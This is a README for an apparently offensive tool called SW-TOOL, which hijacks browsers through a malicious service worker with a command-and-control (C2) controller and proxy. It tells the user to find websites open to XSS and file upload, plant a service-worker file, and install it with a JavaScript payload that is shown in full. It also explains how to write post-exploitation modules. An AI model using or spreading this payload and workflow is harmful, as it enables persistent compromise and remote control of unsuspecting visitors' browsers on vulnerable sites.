# Welcome to SW-TOOL

## Info
This is just a alpha version. The proxying functions by and large is working fine. 
To setup:
1. run start.sh to:
	- startup the proxy on port 8888. Point your browser proxy to that
	- C2 Controller is listening on port 5000. This is the C@ service the SW communicates with
2. Find a vulnerable website with  XSS + fileupload
   - Upload C2_HOST/modules/sw.js
   - Use XSS to install the SW payload. Use either C2_HOST/modules/xss generater payload. For example, the payload would be:

```
navigator.serviceWorker.register('/PATH_TO_SW.js').then(function(s){
	setTimeout(function(){s.sync.register('outbox');s.sync.register('outbox2');s.sync.register('outbox3');s.sync.register('outbox4');Notification.requestPermission().then(function(){s.active.postMessage({'p':'1'})});}, 100);
});
```

To create a custom post-exploitation module:
1. Create a JS with the MODULE_FILENAME.js under: `app/templates/modules`
2. Content of the module has to be:
```
registerModule('MODULE_NAME', null);
// DO STUFF
// ONCE FINISHED, CALL 
deregisterModule('MODULE_NAME');
```

## License

This tool is released under the [MIT License](https://opensource.org/licenses/MIT).